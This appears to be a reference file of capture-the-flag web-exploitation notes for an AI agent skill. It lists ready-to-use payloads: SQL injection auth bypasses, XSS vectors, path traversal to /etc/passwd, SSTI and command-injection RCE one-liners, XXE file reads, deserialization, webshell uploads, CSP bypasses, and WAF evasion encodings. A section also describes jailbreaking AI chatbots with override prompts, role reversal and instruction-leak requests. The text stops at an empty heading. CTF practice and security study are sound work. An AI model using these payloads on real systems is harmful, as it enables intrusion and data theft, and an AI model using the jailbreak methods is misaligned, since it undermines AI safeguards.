# CTF Web Field Notes

Long-form exploit notes that were moved out of `SKILL.md` so the main skill can stay focused on routing and first-pass execution.

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [SQL Injection Quick Reference](#sql-injection-quick-reference)
- [XSS Quick Reference](#xss-quick-reference)
- [XSSI via JSONP Callback Exfiltration](#xssi-via-jsonp-callback-exfiltration)
- [Path Traversal / LFI Quick Reference](#path-traversal--lfi-quick-reference)
- [JWT Quick Reference](#jwt-quick-reference)
- [SSTI Quick Reference](#ssti-quick-reference)
- [Python str.format() Attribute Traversal (PlaidCTF 2017)](#python-strformat-attribute-traversal-plaidctf-2017)
- [SSRF Quick Reference](#ssrf-quick-reference)
- [Command Injection Quick Reference](#command-injection-quick-reference)
- [XXE Quick Reference](#xxe-quick-reference)
- [PHP Type Juggling Quick Reference](#php-type-juggling-quick-reference)
- [PHP File Inclusion / LFI Quick Reference](#php-file-inclusion--lfi-quick-reference)
- [Code Injection Quick Reference](#code-injection-quick-reference)
- [Java Deserialization](#java-deserialization)
- [Python Pickle Deserialization](#python-pickle-deserialization)
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
- [Node.js Quick Reference](#nodejs-quick-reference)
- [Auth & Access Control Quick Reference](#auth--access-control-quick-reference)
- [Apache CVE-2012-0053 HttpOnly Cookie Leak](#apache-cve-2012-0053-httponly-cookie-leak)
- [Apache mod_status Information Disclosure](#apache-mod_status-information-disclosure)
- [Open Redirect Chains](#open-redirect-chains)
- [Subdomain Takeover](#subdomain-takeover)
- [File Upload to RCE](#file-upload-to-rce)
- [Multi-Stage Chain Patterns](#multi-stage-chain-patterns)
- [Flask/Werkzeug Debug Mode](#flaskwerkzeug-debug-mode)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [JSFuck Decoding](#jsfuck-decoding)
- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
- [WeasyPrint SSRF & File Read (CVE-2024-28184)](#weasyprint-ssrf--file-read-cve-2024-28184)
- [MongoDB Regex / $where Blind Injection](#mongodb-regex--where-blind-injection)
- [Pongo2 / Go Template Injection](#pongo2--go-template-injection)
- [ZIP Upload with PHP Webshell](#zip-upload-with-php-webshell)
- [basename() Bypass for Hidden Files](#basename-bypass-for-hidden-files)
- [Custom Linear MAC Forgery](#custom-linear-mac-forgery)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
- [SSRF to Docker API RCE Chain](#ssrf-to-docker-api-rce-chain)
- [Castor XML Deserialization via xsi:type (Atlas HTB)](#castor-xml-deserialization-via-xsitype-atlas-htb)
- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
- [HTTP TRACE Method Bypass](#http-trace-method-bypass)
- [LLM/AI Chatbot Jailbreak](#llmai-chatbot-jailbreak)
- [Admin Bot javascript: URL Scheme Bypass](#admin-bot-javascript-url-scheme-bypass)
- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
- [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
- [CSS Font Glyph + Container Query Data Exfiltration (UNbreakable 2026)](#css-font-glyph--container-query-data-exfiltration-unbreakable-2026)
- [Hyperscript / Alpine.js CDN CSP Bypass (UNbreakable 2026)](#hyperscript--alpinejs-cdn-csp-bypass-unbreakable-2026)
- [Solidity Transient Storage Clearing Collision (0.8.28-0.8.33)](#solidity-transient-storage-clearing-collision-0828-0833)
- [Chrome Unicode URL Normalization Bypass (RCTF 2017)](#chrome-unicode-url-normalization-bypass-rctf-2017)
- [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
- [JA4/JA4H TLS Fingerprint Matching (BSidesSF 2026)](#ja4ja4h-tls-fingerprint-matching-bsidessf-2026)
- [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
- [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
- [XPath Blind Injection (BaltCTF 2013)](#xpath-blind-injection-baltctf-2013)
- [SQLite File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
- [CSP Bypass via link prefetch (Boston Key Party 2016)](#csp-bypass-via-link-prefetch-boston-key-party-2016)
- [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
- [Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)](#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016)
- [Common Flag Locations](#common-flag-locations)

## Reconnaissance

- View source for HTML comments, check JS/CSS files for internal APIs
- Look for `.map` source map files
- Check response headers for custom X- headers and auth hints
- Common paths: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/api`, `/debug`, `/.git/`, `/.env`
- Search JS bundles: `grep -oE '"/api/[^"]+"'` for hidden endpoints
- Check for client-side validation that can be bypassed
- Compare what the UI sends vs. what the API accepts (read JS bundle for all fields)
- Check assets returning 404 status — `favicon.ico`, `robots.txt` may contain data despite error codes: `strings favicon.ico | grep -i flag`
- Tor hidden services: `feroxbuster -u 'http://target.onion/' -w wordlist.txt --proxy socks5h://127.0.0.1:9050 -t 10 -x .txt,.html,.bak`

## SQL Injection Quick Reference

**Detection:** Send `'` — syntax error indicates SQLi

```sql
' OR '1'='1                    # Classic auth bypass
' OR 1=1--                     # Comment termination
username=\&password= OR 1=1--  # Backslash escape quote bypass
' UNION SELECT sql,2,3 FROM sqlite_master--  # SQLite schema
0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
```

WAF bypasses: XML entity encoding (`&#x55;NION`), EXIF metadata injection (`exiftool -Comment="' UNION SELECT..."`), Shift-JIS `\u00a5`→`0x5c` backslash, QR code payload injection, double-keyword nesting (`selselectect`). See [sql-injection.md](sql-injection.md) for all techniques.

MySQL session variable dual-value injection: `@var:=` assigns return different values across sequential queries in one connection. PHP PCRE backtrack limit WAF bypass: 1M+ chars cause `preg_match()` to return `false`, passing `!false`. `information_schema.processlist` race condition leaks secrets from concurrent queries. See [sql-injection.md](sql-injection.md).

See [server-side-exec.md](server-side-exec.md) for PHP preg_replace /e RCE and Prolog injection. See [server-side-exec-2.md](server-side-exec-2.md) for SQLi via DNS records and SQLi keyword fragmentation.

## XSS Quick Reference

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Filter bypass: hex `\x3cscript\x3e`, entities `&#60;script&#62;`, case mixing `<ScRiPt>`, event handlers.
- **XSS dot-filter bypass:** Decimal IP (`1558071511` = `92.123.45.67`) eliminates dots from URLs. JavaScript bracket notation (`document["cookie"]`) replaces dot property access. See [client-side-advanced.md](client-side-advanced.md#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016).
- **Cross-origin cookie XSS:** Set cookie with `domain=.parent.tld` from one subdomain to inject XSS payload rendered on a sibling subdomain. See [client-side-advanced.md](client-side-advanced.md#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017).
- **AngularJS 1.x sandbox escape:** Override `String.prototype.charAt` with `trim` to bypass AngularJS expression sandbox, then `$eval` arbitrary JS. See [client-side.md](client-side.md#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017).

See [client-side.md](client-side.md) for DOMPurify bypass, cache poisoning, CSPT, React input tricks.

## XSSI via JSONP Callback Exfiltration

JSONP endpoint (`?callback=func`) wraps sensitive data in a function call. Load cross-origin via `<script src>` with custom callback to exfiltrate. Chain: SHA1 cookie inversion -> IDOR on debug endpoint -> XSSI -> cloud function OOB. See [client-side-advanced.md](client-side-advanced.md#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026).

## Path Traversal / LFI Quick Reference

```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Windows 8.3 short filename bypass:** `FILEFO~1.EXT` short names bypass path filters that check the long filename. See [server-side-advanced-2.md](server-side-advanced-2.md#windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016).

**URL parse_url @ bypass:** `http://valid@attacker.com/` -- PHP `parse_url()` extracts `attacker.com` as host, bypassing domain checks. See [server-side-advanced-2.md](server-side-advanced-2.md#url-parse_url--symbol-bypass-ekoparty-ctf-2016).
- **SSRF double-@ parse discrepancy:** `http://x:x@127.0.0.1:80@allowed.host/path` — `parse_url()` sees `allowed.host`, curl connects to `127.0.0.1`. Distinct from single-@ bypass. See [server-side-advanced-2.md](server-side-advanced-2.md#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016).

**/dev/fd symlink bypass:** When `/proc` is blacklisted, use `/dev/fd/../environ` -- `/dev/fd` symlinks to `/proc/self/fd`, so `../` reaches `/proc/self/`. See [server-side-advanced.md](server-side-advanced.md#devfd-symlink-to-bypass-proc-filter-google-ctf-2017).

**Python footgun:** `os.path.join('/app/public', '/etc/passwd')` returns `/etc/passwd`

## JWT Quick Reference

1. `alg: none` — remove signature entirely
2. Algorithm confusion (RS256→HS256) — sign with public key
3. Weak secret — brute force with hashcat/flask-unsign
4. Key exposure — check `/api/getPublicKey`, `.env`, `/debug/config`
5. Balance replay — save JWT, spend, replay old JWT, return items for profit
6. Unverified signature — modify payload, keep original signature
7. JWK header injection — embed attacker public key in token header
8. JKU header injection — point to attacker-controlled JWKS URL
9. KID path traversal — `../../../dev/null` for empty key, or SQL injection in KID

See [auth-jwt.md](auth-jwt.md) for full JWT/JWE attacks and session manipulation.

## SSTI Quick Reference

**Detection:** `{{7*7}}` returns `49`

```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
# Jinja2 quote bypass (keyword args):
{{obj.__dict__.update(attr=value) or obj.name}}
```

**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Twig repeats string, Jinja2 returns 49). See [server-side.md](server-side.md#mako-ssti) and [server-side.md](server-side.md#twig-ssti).

**Quote filter bypass:** Use `__dict__.update(key=value)` — keyword arguments need no quotes. See [server-side.md](server-side.md#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026).

**ERB SSTI (Ruby/Sinatra):** `<%= Sequel::DATABASES.first[:table].all %>` bypasses ERBSandbox variable-name restrictions via the global `Sequel::DATABASES` array. See [server-side.md](server-side.md#erb-ssti--sequeldatabases-bypass-bearcatctf-2026).

## Python str.format() Attribute Traversal (PlaidCTF 2017)

Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`). When user input reaches `.format(obj)`, leak arbitrary attributes without a template engine. Distinct from SSTI. See [server-side.md](server-side.md#python-strformat-attribute-traversal-plaidctf-2017).

**Thymeleaf SpEL SSTI (Java/Spring):** `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}` reads files via Spring utility classes when standard I/O is WAF-blocked. Works in distroless containers (no shell). See [server-side-exec.md](server-side-exec.md#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026).

## SSRF Quick Reference

```text
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

DNS rebinding for TOCTOU: https://lock.cmpxchg8b.com/rebinder.html

**Host header SSRF:** Server builds internal request URL from `Host` header (e.g., `http.Get("http://" + request.Host + "/validate")`). Set Host to attacker domain → validation request goes to attacker server. See [server-side.md](server-side.md#host-header-ssrf-mireactf).

**ElasticSearch Groovy RCE via SSRF:** SSRF to internal ES on port 9200 enables RCE through `script_fields` Groovy scripting (pre-5.0). See [server-side-advanced-2.md](server-side-advanced-2.md#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017).

## Command Injection Quick Reference

```bash
; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag
```

When cat/head blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`

**Bash brace expansion (space-free injection):** `{ls,-la,..}` expands to `ls -la ..` without literal spaces. See [server-side-exec-2.md](server-side-exec-2.md#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016).

**Git CLI newline injection:** `%0a` in URL path breaks out of backtick/system() shell calls that only filter `;|&<>`. See [server-side.md](server-side-2.md#git-cli-newline-injection-via-url-path-bsidessf-2026).

## XXE Quick Reference

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

PHP filter: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`

**XXE in DOCX uploads:** DOCX is ZIP+XML; inject XXE in `[Content_Types].xml` inside the archive. See [server-side.md](server-side-2.md#xxe-via-docxoffice-xml-upload-school-ctf-2016).

## PHP Type Juggling Quick Reference

Loose `==` performs type coercion: `0 == "string"` is `true`, `"0e123" == "0e456"` is `true` (magic hashes). Send JSON integer `0` to bypass string password checks. `strcmp([], "str")` returns `NULL` which passes `!strcmp()`. Use `===` for defense.

See [server-side.md](server-side.md#php-type-juggling) for comparison table and exploit payloads.

## PHP File Inclusion / LFI Quick Reference

`php://filter/convert.base64-encode/resource=config` leaks PHP source code without execution. Common LFI targets: `/etc/passwd`, `/proc/self/environ`, app config files. Null byte (`%00`) truncates `.php` suffix on PHP < 5.3.4.

See [server-side.md](server-side.md#php-file-inclusion--phpfilter) for filter chains and RCE techniques.

## Code Injection Quick Reference

**Ruby `instance_eval`:** Break string + comment: `VALID');INJECTED_CODE#`
**Perl `open()`:** 2-arg open allows pipe: `|command|`
**JS `eval` blocklist bypass:** `row['con'+'structor']['con'+'structor']('return this')()`
**PHP deserialization:** Craft serialized object in cookie → LFI/RCE
**LaTeX injection:** `\input{|"cat /flag.txt"}` — shell command via pipe syntax in PDF generation services. `\@@input"/etc/passwd"` for file reads without shell.
- **LaTeX restricted write18 bypass:** When `write18` is restricted, `mpost -ini "-tex=bash -c (cmd)" file.mp` uses mpost's whitelisted status to execute arbitrary commands. `${IFS}` replaces spaces. See [server-side-advanced-2.md](server-side-advanced-2.md#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016).

**PHP backtick eval (character limit):** `` echo`cat *`; `` -- PHP backticks = `shell_exec()`, fits RCE in as few as 8 chars. Use `` `$_GET[0]`; `` to move payload to URL parameter. See [server-side-exec.md](server-side-exec.md#php-backtick-eval-under-character-limit-easyctf-2017).
**PHP assert() injection:** `assert("strpos('$input', '..') === false")` — inject `') || system('cmd');//` for RCE (PHP < 7.2). See [server-side-exec.md](server-side-exec.md#php-assert-string-evaluation-injection-csaw-ctf-2016).
**Common Lisp `read` injection:** `#.(run-shell-command "cat /flag")` — reader macro evaluates at parse time. See [server-side-exec-2.md](server-side-exec-2.md#common-lisp-injection-via-reader-macro-insomnihack-2016).
**Ruby ObjectSpace scanning:** `ObjectSpace.each_object(String)` dumps all in-memory strings including flag. See [server-side-exec.md](server-side-exec.md#ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016).

See [server-side-exec.md](server-side-exec.md) for full payloads and bypass techniques.

## Java Deserialization

Serialized Java objects (`rO0AB` / `aced0005`) + ysoserial gadget chains → RCE via `ObjectInputStream.readObject()`. Try `CommonsCollections1-7`, `URLDNS` for blind detection. See [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial).

## Python Pickle Deserialization

`pickle.loads()` calls `__reduce__()` → `(os.system, ('cmd',))` instant RCE. Also via `yaml.load()`, `torch.load()`, `joblib.load()`. See [server-side-deser.md](server-side-deser.md#python-pickle-deserialization).

## Race Conditions (Time-of-Check to Time-of-Use)

Concurrent requests bypass check-then-act patterns (balance, coupons, registration). Send 50 simultaneous requests — all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-time-of-check-to-time-of-use).

## Node.js Quick Reference

**Prototype pollution:** `{"__proto__": {"isAdmin": true}}` or flatnest circular ref bypass
**VM escape:** `this.constructor.constructor("return process")()` → RCE
**Full chain:** pollution → enable JS eval in Happy-DOM → VM escape → RCE

**Prototype pollution permission bypass:** `{"__proto__":{"isAdmin":true}}` on JSON endpoints pollutes `Object.prototype`. Always try `__proto__` injection even when the vulnerability seems like something else.

See [node-and-prototype.md](node-and-prototype.md) for detailed exploitation.

## Auth & Access Control Quick Reference

- Cookie manipulation: `role=admin`, `isAdmin=true`
- Public admin-login cookie seeding: check if `/admin/login` sets reusable admin session cookie
- Host header bypass: `Host: 127.0.0.1`
- Hidden endpoints: search JS bundles for `/api/internal/`, `/api/admin/`; fuzz with auth cookie for non-`/api` routes like `/internal/*`
- Client-side gates: `window.overrideAccess = true` or call API directly
- Password inference: profile data + structured ID format → brute-force
- Weak signature: check if only first N chars of hash are validated
- Affine cipher OTP: only 312 possible values (`12 mults × 26 adds`), brute-force all in seconds
- TOTP srand(time()) weakness: sync server clock to predict codes. See [auth-and-access.md](auth-and-access.md#totp-recovery-via-php-srandtime-seed-weakness-tum-ctf-2016)
- Express.js `%2F` middleware bypass, IDOR on WIP endpoints, git history credential leakage
- CI/CD variable theft, identity provider API takeover (bypass MFA: `not_configured_action: skip`)
- SAML SSO automation, Guacamole parameter extraction, login page poisoning, TeamCity REST API RCE

## Apache CVE-2012-0053 HttpOnly Cookie Leak

Send oversized `Cookie` header to trigger 400 Bad Request; Apache's error page reflects the cookie value, leaking HttpOnly cookies. See [cves.md](cves.md#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016).

## Apache mod_status Information Disclosure

`/server-status` endpoint reveals active URLs, client IPs, and session data. Use for admin endpoint discovery and session forging. See [auth-and-access.md](auth-and-access.md#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012).

## Open Redirect Chains

Chain open redirects (`?redirect=`, `?next=`, `?url=`) with OAuth flows for token theft. Bypass validation with `@`, `%00`, `//`, `\`, CRLF. See [auth-and-access.md](auth-and-access.md#open-redirect-chains).

## Subdomain Takeover

Dangling CNAME → claim resource on external service (GitHub Pages, S3, Heroku). Use `subfinder` + `httpx` to enumerate, check fingerprints. See [auth-and-access.md](auth-and-access.md#subdomain-takeover).

See [auth-and-access.md](auth-and-access.md) for access control bypasses, [auth-jwt.md](auth-jwt.md) for JWT/JWE attacks, and [auth-infra.md](auth-infra.md) for OAuth/SAML/CI-CD/infrastructure auth.

## File Upload to RCE

- `.htaccess` upload: `AddType application/x-httpd-php .lol` + webshell
- Gogs symlink: overwrite `.git/config` with `core.sshCommand` RCE
- Python `.so` hijack: write malicious shared object + delete `.pyc` to force reimport
- ZipSlip: symlink in zip for file read, path traversal for file write
- Log poisoning: PHP payload in User-Agent + path traversal to include log
- PNG/PHP polyglot + double extension: valid PNG with `<?php` after IEND chunk, uploaded as `.png.php`; when `disable_functions` blocks exec, use `scandir('/')` + `file_get_contents()` for flag. See [server-side-exec-2.md](server-side-exec-2.md#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026).

See [server-side-exec.md](server-side-exec.md) and [server-side-exec-2.md](server-side-exec-2.md) for detailed steps.

## Multi-Stage Chain Patterns

**0xClinic chain:** Password inference → path traversal + ReDoS oracle (leak secrets from `/proc/1/environ`) → CRLF injection (CSP bypass + cache poisoning + XSS) → urllib scheme bypass (SSRF) → `.so` write via path traversal → RCE

**Key chaining insights:**
- Path traversal + any file-reading primitive → leak `/proc/*/environ`, `/proc/*/cmdline`
- CRLF in headers → CSP bypass + cache poisoning + XSS in one shot
- Arbitrary file write in Python → `.so` hijacking or `.pyc` overwrite for RCE
- Lowercased response body → use hex escapes (`\x3c` for `<`)

## Flask/Werkzeug Debug Mode

Weak session secret brute-force + forge admin session + Werkzeug debugger PIN RCE. See [server-side-advanced.md](server-side-advanced.md#flaskwerkzeug-debug-mode-exploitation) for full attack chain.

## XXE with External DTD Filter Bypass

Host malicious DTD externally to bypass upload keyword filters. See [server-side-advanced.md](server-side-advanced.md#xxe-with-external-dtd-filter-bypass) for payload and webhook.site setup.

## JSFuck Decoding

Remove trailing `()()`, eval in Node.js, `.toString()` reveals original code. See [client-side.md](client-side.md#jsfuck-decoding).

## DOM XSS via jQuery Hashchange (Crypto-Cat)

`$(location.hash)` + `hashchange` event → XSS via iframe: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`. See [client-side.md](client-side.md#dom-xss-via-jquery-hashchange-crypto-cat).

## Shadow DOM XSS

Proxy `attachShadow` to capture closed roots; `(0,eval)` for scope escape; `</script>` injection. See [client-side.md](client-side.md#shadow-dom-xss).

## DOM Clobbering + MIME Mismatch

`.jpg` served as `text/html`; `<form id="config">` clobbers JS globals. See [client-side.md](client-side.md#dom-clobbering--mime-mismatch).

## HTTP Request Smuggling via Cache Proxy

Cache proxy desync for cookie theft via incomplete POST body. See [client-side.md](client-side.md#http-request-smuggling-via-cache-proxy).

## Path Traversal: URL-Encoded Slash Bypass

`%2f` bypasses nginx route matching but filesystem resolves it. See [server-side-advanced.md](server-side-advanced.md#path-traversal-url-encoded-slash-bypass).

## WeasyPrint SSRF & File Read (CVE-2024-28184)

`<a rel="attachment" href="file:///flag.txt">` or `<link rel="attachment" href="http://127.0.0.1/admin">` -- WeasyPrint embeds fetched content as PDF attachments, bypassing header checks. Boolean oracle via `/Type /EmbeddedFile` presence. See [server-side-advanced-4.md](server-side-advanced-4.md#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026) and [cves.md](cves.md#cve-2024-28184-weasyprint-attachment-ssrf--file-read).

## MongoDB Regex / $where Blind Injection

Break out of `/.../i` with `a^/)||(<condition>)&&(/a^`. Binary search `charCodeAt()` for extraction. See [server-side-advanced-4.md](server-side-advanced-4.md#mongodb-regex-injection--where-blind-oracle-nullcon-2026).

## Pongo2 / Go Template Injection

`{% include "/flag.txt" %}` in uploaded file + path traversal in template parameter. See [server-side-advanced-4.md](server-side-advanced-4.md#pongo2--go-template-injection-via-path-traversal-nullcon-2026).

## ZIP Upload with PHP Webshell

Upload ZIP containing `.php` file → extract to web-accessible dir → `file_get_contents('/flag.txt')`. See [server-side-advanced-4.md](server-side-advanced-4.md#zip-upload-with-php-webshell-nullcon-2026).

## basename() Bypass for Hidden Files

`basename()` only strips dirs, doesn't filter `.lock` or hidden files in same directory. See [server-side-advanced-4.md](server-side-advanced-4.md#basename-bypass-for-hidden-files-nullcon-2026).

## Custom Linear MAC Forgery

Linear XOR-based signing with secret blocks → recover from known pairs → forge for target. See [auth-and-access.md](auth-and-access.md#custom-linear-macsignature-forgery-nullcon-2026).

## CSS/JS Paywall Bypass

Content behind CSS overlay (`position: fixed; z-index: 99999`) is still in the raw HTML. `curl` or view-source bypasses it instantly. See [client-side.md](client-side.md#cssjs-paywall-bypass).

## SSRF to Docker API RCE Chain

SSRF to unauthenticated Docker daemon on port 2375. Use `/archive` for file extraction, `/exec` + `/exec/{id}/start` for command execution. Chain through internal POST relay when SSRF is GET-only. See [server-side-advanced-2.md](server-side-advanced-2.md#ssrf-to-docker-api-rce-chain-h7ctf-2025).

## Castor XML Deserialization via xsi:type (Atlas HTB)

Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes for arbitrary Java class instantiation. Chain through JNDI (Java Naming and Directory Interface) / RMI (Remote Method Invocation) via ysoserial `CommonsBeanutils1` for RCE. Requires Java 11 (not 17+). Check `pom.xml` for `castor-xml`. See [server-side-advanced-2.md](server-side-advanced-2.md#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb).

## Apache ErrorDocument Expression File Read (Zero HTB)

`.htaccess` with `ErrorDocument 404 "%{file:/etc/passwd}"` reads files at Apache level, bypassing `php_admin_flag engine off`. Requires `AllowOverride FileInfo`. Upload via SFTP, trigger with 404 request. See [server-side-advanced-2.md](server-side-advanced-2.md#apache-errordocument-expression-file-read-zero-htb).

## HTTP TRACE Method Bypass

Endpoints returning 403 on GET/POST may respond to TRACE, PUT, PATCH, or DELETE. Test with `curl -X TRACE`. See [auth-and-access.md](auth-and-access.md#http-trace-method-bypass-bypass-ctf-2025).

## LLM/AI Chatbot Jailbreak

AI chatbots guarding flags can be bypassed with system override prompts, role-reversal, or instruction leak requests. Rotate session IDs and escalate prompt severity. See [auth-and-access.md](auth-and-access.md#llmai-chatbot-jailbreak-bypass-ctf-2025).

## Admin Bot javascript: URL Scheme Bypass

`new URL()` validates syntax only, not protocol — `javascript:` URLs pass and execute in Puppeteer's authenticated context. CSP/SRI on the target page are irrelevant since JS runs in navigation context. See [client-side.md](client-side.md#admin-bot-javascript-url-scheme-bypass-dicectf-2026).

## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

HTML injection → meta refresh redirect (CSP bypass) → admin bot loads attacker page → JavaScript makes cross-origin GET requests to `localhost` GraphQL endpoint via `new Image().src` → measures time-based SQLi (`SLEEP(1)`) through image error timing → character-by-character flag exfiltration. GraphQL GET requests bypass CORS preflight. See [client-side.md](client-side.md#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty).

## React Server Components Flight Protocol RCE (Ehax 2026)

Identify via `Next-Action` + `Accept: text/x-component` headers. CVE-2025-55182: fake Flight chunk exploits constructor chain for server-side JS execution. Exfiltrate via `NEXT_REDIRECT` error → `x-action-redirect` header. WAF bypass: `'chi'+'ld_pro'+'cess'` or hex `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`. See [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-protocol-rce-ehax-2026) and [cves.md](cves.md#cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce).

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**Pattern:** Sanitizer regex uses ASCII-only matching (`<\s*script`), but downstream processing applies Unicode case folding (`strings.EqualFold`). `<ſcript>` (U+017F Latin Long S) bypasses regex but folds to `<script>`. Other pairs: `ı`→`i`, `K` (U+212A)→`k`. See [client-side-advanced.md](client-side-advanced.md#unicode-case-folding-xss-bypass-unbreakable-2026).

## CSS Font Glyph + Container Query Data Exfiltration (UNbreakable 2026)

**Pattern:** Exfiltrate inline text via CSS injection (no JS). Custom font assigns unique glyph widths per character. Container queries match width ranges to fire background-image requests -- one request per character. Works under strict CSP. See [client-side-advanced.md](client-side-advanced.md#css-font-glyph-width--container-query-exfiltration-unbreakable-2026).

## Hyperscript / Alpine.js CDN CSP Bypass (UNbreakable 2026)

**Pattern:** CSP allows `cdnjs.cloudflare.com`. Load Hyperscript (`_=` attributes) or Alpine.js (`x-data`, `x-init`) from CDN -- they execute code from HTML attributes that sanitizers don't strip. See [client-side-advanced.md](client-side-advanced.md#hyperscript-cdn-csp-bypass-unbreakable-2026).

## Solidity Transient Storage Clearing Collision (0.8.28-0.8.33)

**Pattern:** Solidity IR pipeline (`--via-ir`) generates identically-named Yul helpers for `delete` on persistent and transient variables of the same type. One uses `sstore`, the other should use `tstore`, but deduplication picks only one. Exploits: overwrite `owner` (slot 0) via transient `delete`, or make persistent `delete` (revoke approvals) ineffective. Workaround: use `_lock = address(0)` instead of `delete _lock`. See [web3.md](web3.md#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833).

## Chrome Unicode URL Normalization Bypass (RCTF 2017)

Chrome's IDNA/punycode normalization converts fullwidth Unicode characters (U+FF00-U+FF5E) to ASCII equivalents, bypassing length checks and character filters on domain names. See [client-side-advanced.md](client-side-advanced.md#chrome-unicode-url-normalization-bypass-rctf-2017).

## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)

**Pattern:** CSP uses `script-src 'nonce-xxx'` but missing `base-uri` directive. Inject `<base href="https://attacker.com/">` before a nonced `<script src="relative.js">` -- script loads from attacker server but satisfies CSP via the valid nonce. Defense: always include `base-uri 'self'`. See [client-side-advanced.md](client-side-advanced.md#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026).

## JA4/JA4H TLS Fingerprint Matching (BSidesSF 2026)

**Pattern:** Server validates browser identity via JA4 (TLS ClientHello fingerprint) and JA4H (HTTP header ordering fingerprint) in addition to User-Agent. Spoofing UA alone fails; must match the target browser's TLS cipher suite order and HTTP header sequence. For legacy browsers, run the actual browser. See [auth-and-access.md](auth-and-access.md#ja4ja4h-tls-and-http-fingerprint-matching-bsidessf-2026).

## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)

